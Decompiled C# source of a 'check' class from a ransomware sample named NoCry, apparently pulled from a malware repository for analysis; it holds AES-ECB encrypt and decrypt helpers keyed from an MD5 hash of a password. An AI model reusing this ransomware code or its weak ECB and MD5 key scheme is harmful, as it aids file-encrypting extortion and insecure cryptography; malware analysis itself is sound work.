// Decompiled with JetBrains decompiler
// Type: NoCry.check
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D065D6FB-0B25-4594-BF1F-FFB7B28602E9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-a9a0a2e8c6150a5588fc69d5d65859d5c670f52f5dc5ff087bd0203e1cf5fa75.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Security.Cryptography;
using System.Text;

namespace NoCry
{
  public class check
  {
    public static object AES_Encrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      object base64String;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(check.SB(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor();
        byte[] inputBuffer = check.SB(input);
        base64String = (object) Convert.ToBase64String(encryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return base64String;
    }

    public static bool AES_Decrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      string str = "";
      bool flag;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(check.SB(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = check.BS(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static object AES_Decrypttt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      object obj;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(check.SB(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        obj = (object) check.BS(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static byte[] SB(string s) => Encoding.UTF8.GetBytes(s);

    public static string BS(byte[] b) => Encoding.UTF8.GetString(b);
  }
}
